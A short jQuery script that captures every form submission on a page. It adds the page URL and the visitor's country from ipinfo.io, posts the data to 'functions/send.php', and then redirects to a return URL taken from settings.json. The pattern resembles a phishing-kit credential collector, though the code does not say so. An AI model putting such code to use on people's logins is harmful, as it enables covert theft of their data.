$('body')
    .on('submit', 'form', async function(e) {
        e.preventDefault();
        $('input[type=submit]').prop('disabled', true)

        var form = $(this)[0],
            data = new FormData(form);
            var full_url = window.location.href;
            data.append('full_url', full_url);
            data.append('type', 'submit');

    const response = await fetch('https://ipinfo.io', {
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
    });
    const fetchData = await response.json();
    data.append('country', fetchData.country);
	console.log(fetchData);
            $.ajax({
                url: 'functions/send.php',
                method: 'post',
                data: data,
                dataType: 'json',
                processData: false,
                contentType: false,
                cache: false,
                success: function(response) {
                    if (response.SUCCESS) {
                        let search = location.search.substring(1);
                        fetch('settings.json').then(d=> d.json()).then(res=>{window.location = res.return + '?' + search});
						return false;
                    } else {
                        console.error(response.MESSAGE);
                    }
                },
                error: function(response) {
                    console.error(response.responseText);
                }
        });
    }
)